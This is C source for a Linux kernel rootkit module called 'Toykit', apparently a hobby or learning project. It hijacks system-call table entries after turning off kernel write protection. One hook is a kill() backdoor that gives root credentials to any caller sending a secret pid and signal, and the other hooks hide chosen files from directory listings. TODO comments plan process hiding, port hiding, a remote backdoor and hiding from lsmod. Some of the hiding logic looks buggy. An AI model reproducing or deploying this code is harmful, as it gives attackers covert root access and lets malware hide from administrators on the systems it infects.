#include <asm/unistd.h>
#include <linux/highmem.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/dirent.h>

// TODO 
// Hide files and processes
// Hide ports and add remote backdoor
// Hide self from lsmod and other commands
// Find the sys_call_table programmatically
// Cite sources and document

// for local backdoor
#define LOCAL_PID 12345
#define LOCAL_SIG 31

// for controlling the file hider
#define HIDE_SIG 16

// for writing to sys_call_table
#define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
#define GPF_ENABLE write_cr0(read_cr0() | 0x10000)

unsigned long *sys_call_table = (unsigned long*)0xc15b0000;  // hard coded, grep /boot/System.map

// for hijacking sys_kill
typedef asmlinkage int (*kill_ptr)(pid_t pid, int sig); // for casting to avoid warnings
kill_ptr orig_kill;

static LIST_HEAD(hidden_files); // list of inodes to hide

struct hidden_file { // struct for list of inodes
	unsigned long long inode;
	struct list_head list;
};

asmlinkage int hacked_kill(pid_t pid, int sig)
{
	int actual_result;
	struct hidden_file *toAdd;

	// kill backdoor
	if (pid == LOCAL_PID && sig == LOCAL_SIG) {
		struct cred *cred;
		cred = (struct cred *)__task_cred(current);
		cred->uid = 0;
		cred->gid = 0;
		cred->suid = 0;
		cred->sgid = 0;
		cred->euid = 0;
		cred->egid = 0;
		cred->fsuid = 0;
		cred->fsgid = 0;
		return 0;
	}
	// file hiding, pid = inode of file to be hidden
	else if (sig == HIDE_SIG) { 
		toAdd = kmalloc(sizeof(struct hidden_file),GFP_KERNEL);
		toAdd->inode = (unsigned long long) pid;
		INIT_LIST_HEAD(&toAdd->list);
		list_add_tail(&toAdd->list,&hidden_files);
		printk(KERN_INFO "Adding inode %i\n",pid);
		return 0;
	}

	actual_result = (*orig_kill)(pid,sig);
	return actual_result;
}

// for hijacking sys_getdents
struct linux_dirent {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	char d_name[256];
	char pad;
	char d_type;
};

typedef asmlinkage int (*getdents_ptr)(unsigned int fd, struct linux_dirent *dirp,
                                       unsigned int count);
getdents_ptr orig_getdents;

asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
                               unsigned int count)
{
	int actual_result, i;
	struct hidden_file *ptr;
	struct linux_dirent toWorkWith;
	struct linux_dirent *forUser;

	printk(KERN_INFO "Running hacked_getdents\n");

	// check user space access and allocate kernel space linux_dirent
	if (!access_ok(VERIFY_READ,dirp,count))
		return -1;
	if ((forUser = kmalloc(count,GFP_KERNEL)) == NULL)
		return -1;

	// run real getdent and check result for files to hide
	actual_result = (*orig_getdents)(fd,dirp,count);
	if (actual_result > 0) { // actually read some bytes
		printk(KERN_INFO "Checking dirp\n");
		for (i = 0; i < actual_result / sizeof(struct linux_dirent); i++) {
			if (copy_from_user(&toWorkWith,dirp + i,sizeof(struct linux_dirent)))
				return -1;
			list_for_each_entry(ptr,&hidden_files,list) {
				printk(KERN_INFO "Current inode: %lu\n", toWorkWith.d_ino);
				printk(KERN_INFO "Saved inode: %llu\n", ptr->inode);
				if (toWorkWith.d_ino == ptr->inode) {
					printk(KERN_INFO "Found file to hide\n");
					continue;
				}
			}
			*forUser++ = toWorkWith;
		}
	}
	else {
		return actual_result;
	}

	// copy linux_dirent * to user space
	if (!access_ok(VERIFY_WRITE,dirp,count))
		return -1;
	if (copy_to_user(dirp,forUser,count))
		return -1;
	kfree(forUser);

	// return actual result
	return actual_result;
}

typedef asmlinkage int (*getdents64_ptr)(unsigned int fd, struct linux_dirent64 *dirp,
                                         unsigned int count);
getdents64_ptr orig_getdents64;

asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                                 unsigned int count)
{
	int actual_result, hacked_result, bp;
	struct hidden_file *ptr;
	char *kdirp; // char buffer so we can do pointer arithmetic by byte
	struct linux_dirent64 *d;

	printk(KERN_INFO "Running hacked_getdents64\n");

	// run real getdents64 
	actual_result = (*orig_getdents64)(fd,dirp,count);
	hacked_result = actual_result;

	// copy from user to kernelspace;
	if (!access_ok(VERIFY_READ,dirp,count))
		return -1;
	if ((kdirp = kmalloc(actual_result,GFP_KERNEL)) == NULL)
		return -1;
	if (copy_from_user(kdirp,dirp,actual_result))
		return -1;

	// check result for files to hide
	if (actual_result > 0) { // actually read some bytes
		printk(KERN_INFO "Checking dirp\n");
		for (bp = 0; bp < actual_result;) {
			//printk(KERN_INFO "How many dirps? %i, %i\n",i,number_dirps);
			d = (struct linux_dirent64 *) (kdirp + bp);
			list_for_each_entry(ptr,&hidden_files,list) {
				//printk(KERN_INFO "Current inode: %llu\n", (kdirp + i)->d_ino);
				//printk(KERN_INFO "Saved inode: %llu\n", ptr->inode);
				if (d->d_ino == ptr->inode) {
					printk(KERN_INFO "Found file to hide\n");
					memmove(kdirp + bp,kdirp + bp + d->d_reclen,
					        actual_result - bp + d->d_reclen);
					hacked_result -= d->d_reclen;
				}
			}
			bp += d->d_reclen;
		}
	}

	// copy from kernel to userspace
	if (!access_ok(VERIFY_WRITE,dirp,count))
		return -1;
	if (copy_to_user(dirp,kdirp,count))
		return -1;
	kfree(kdirp);

	// return number of bytes read
	return hacked_result;
}

int rootkit_init(void) {
	GPF_DISABLE;

	orig_kill = (kill_ptr)sys_call_table[__NR_kill];
	sys_call_table[__NR_kill] = (unsigned long)hacked_kill;

	orig_getdents = (getdents_ptr)sys_call_table[__NR_getdents];
	sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;

	orig_getdents64 = (getdents64_ptr)sys_call_table[__NR_getdents64];
	sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;

	GPF_ENABLE;
	printk(KERN_INFO "Loading rootkit\n");
    	return 0;
}

void rootkit_exit(void) {
	struct hidden_file *ptr, *next;
	list_for_each_entry(ptr,&hidden_files,list) {
		printk(KERN_INFO "Inode: %llu\n",ptr->inode);
	}

	GPF_DISABLE;
	sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
	sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
	GPF_ENABLE;

	list_for_each_entry_safe(ptr,next,&hidden_files,list) {
		list_del(&ptr->list);
		kfree(ptr);
	}
	printk(KERN_INFO "Removing rootkit\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Toykit");
MODULE_AUTHOR("Josh Imhoff");
